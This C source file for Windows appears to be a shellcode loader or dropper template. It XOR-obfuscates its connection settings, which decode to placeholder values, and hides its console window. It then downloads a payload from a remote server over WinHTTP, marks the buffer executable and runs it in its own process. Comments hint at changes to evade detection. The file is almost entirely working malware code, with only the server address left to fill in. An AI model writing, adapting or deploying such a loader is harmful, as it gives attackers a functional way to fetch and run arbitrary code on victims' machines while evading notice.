#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

__declspec(dllexport) int main();

#define KEY 24

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")

#pragma optimize("", off)
char strPort[] = { 46, 45, 45, 43, 45 };
char http_https[] = { 112, 108, 108, 104, 107, 119, 106, 112, 108, 108, 104, 41, 42, 43 };
char addr[] = { 42, 45, 45, 54, 42, 45, 45, 54, 42, 45, 45, 54, 42, 45, 45 };
char target[] = { 126, 113, 116, 125, 107, 55, 116, 119, 121, 124, 125, 106, 41, 42, 43, 44, 45, 46, 47, 32, 33, 40, 121, 122, 123, 124, 125, 126, 127, 112, 113, 114, 115, 116, 117, 118, 119, 104, 105, 106, 107, 108, 109, 110, 111, 96, 97, 98, 54, 122, 113, 118 };
#pragma optimize("", on)

// xor
void doxor(char* plain)
{
	DWORD dw_size = strlen(plain);
	for (int i = 0; i < dw_size; i++) 
	{
		plain[i] ^= KEY;
	}
}

void init()
{
	doxor(strPort);
	doxor(http_https);
	doxor(addr);
	doxor(target);
}

//Store byte length of download
long sc_len;

//Fill buf with data from request, return new size of the buf
void readfromreq(char** buf, long iSize, HINTERNET con)
{
	DWORD gatesMagic;
	long toRead = 0;
	if (!WinHttpQueryDataAvailable(con, &toRead))
		printf("[-] Error %u in checking bytes left\n", GetLastError());

	if (toRead == 0)
	{
		sc_len = iSize;
		printf("[+] Read %d bytes\n", iSize);
		return;
	}

	printf("[+] Current size: %d, To Read: %d\n", iSize, toRead);

	//If null create buffer of bytes to read
	if (*buf == NULL)
	{
		*buf = (char*)malloc(toRead + 1);
		ZeroMemory(*buf, toRead + 1);
	}//If does exist we want to make buffer bigger not create a new one
	else
	{
		*buf = (char*)realloc(*buf, iSize + toRead + 1);
		ZeroMemory(*buf + iSize, toRead + 1);
	}
	//Reading contents into the buffer with error checking
	if (!WinHttpReadData(con, (LPVOID)(*buf + iSize), toRead, &gatesMagic))
	{
		printf("[-] Error %u in WinHttpReadData.\n", GetLastError());
	}

	readfromreq(buf, iSize + toRead, con);
}

//Make web request
char* dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target, char* http)
{
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	char* out = NULL;

	//Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"orca/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);//Hmmm, cshot/1.0 seems odd.  I would look into that ;)

	//Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, addr, port, 0);

	//Create an HTTP Request handle
	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"GET",
			target,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			strcmp(http, "https") == 0 ? WINHTTP_FLAG_SECURE : NULL);//WINHTTP_FLAG_SECURE makes secure connection
	}
	else
	{
		printf("[-] Failed to connect to server\n");
	}

	//Send a Request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	else 
	{
		printf("[-] Failed to connect to server\n");
	}

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	else
		printf("[-] Error %d has occurred.\n", GetLastError());

	if (bResults)
	{
		printf("[+] About to fill buffer\n");
		readfromreq(&out, 0, hRequest);
	}
	else
		printf("[-] Error %d has occurred.\n", GetLastError());

	//Close open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	printf("[+] Finished reading file\n");

	return out;
}

void HideWindow() 
{
    HWND hwnd = GetForegroundWindow();
    if (hwnd) 
    {
        ShowWindow(hwnd, SW_HIDE);
    }
}

int main()
{
	HideWindow();
	init();
	BOOL success;
	DWORD dummy = 0;
	DWORD port = atoi(strPort);

	size_t convertedChars;
	size_t wideSize;

	convertedChars = 0;
	wideSize = strlen(addr) + 1;
	wchar_t* w_addr = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, w_addr, wideSize, addr, _TRUNCATE);

	convertedChars = 0;
	wideSize = strlen(target) + 1;
	wchar_t* w_target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, w_target, wideSize, target, _TRUNCATE);

	char* sc = dohttpreq(w_addr, port, w_target, http_https);

	// printf("[+] Injecting shellcode into own process\n");

	//Mark as executable
	success = VirtualProtect(sc, sc_len, PAGE_EXECUTE_READWRITE, &dummy);	//I would look into changing this if I were you ;)
	if (success == 0)
	{
		// printf("[-] VirtualProtect error = %u\n", GetLastError());
		return 0;
	}
	//Execute
	// printf("[+] Executing...\n");
	((void(*)())sc)();
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    BOOL bReturnValue = TRUE;
    switch (dwReason) {
    case DLL_PROCESS_ATTACH: {
        break;
    }
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}